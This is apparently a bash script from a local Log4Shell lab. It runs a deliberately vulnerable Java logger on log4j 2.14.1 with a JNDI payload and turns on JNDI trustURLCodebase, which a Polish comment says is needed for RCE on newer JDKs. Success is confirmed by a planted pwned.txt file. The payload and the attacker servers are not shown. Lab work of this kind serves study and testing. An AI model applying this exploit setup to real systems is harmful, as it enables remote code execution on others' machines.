#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/lib.sh"
need_java
[[ -f "$ROOT/lab/vulnerable/out/VulnerableLogger.class" ]] || ./scripts/build-all.sh

API="${LOG4J_API_JAR:-$PCYB_VENDOR/log4j-api-2.14.1.jar}"
CORE="${LOG4J_CORE_JAR:-$PCYB_VENDOR/log4j-core-2.14.1.jar}"
PAYLOAD="${1:-$(jndi_payload)}"

echo "Payload: $PAYLOAD"
rm -f "$PCYB_EVIDENCE/pwned.txt"

cd "$ROOT"
# trustURLCodebase: wymagane do RCE przez LDAP Reference na JDK >= 8u191
java \
  -Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
  -Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
  -Dlog4j2.configurationFile="$ROOT/lab/vulnerable/out/log4j2.xml" \
  -cp "$ROOT/lab/vulnerable/out:$API:$CORE" \
  VulnerableLogger "$PAYLOAD" | tee "$PCYB_EVIDENCE/victim-stdout.txt"

if [[ -f "$PCYB_EVIDENCE/pwned.txt" ]]; then
  echo
  echo "OK — evidence/pwned.txt:"
  cat "$PCYB_EVIDENCE/pwned.txt"
  exit 0
fi

echo "Brak evidence/pwned.txt — sprawdź LDAP/HTTP i run/*.log" >&2
exit 1
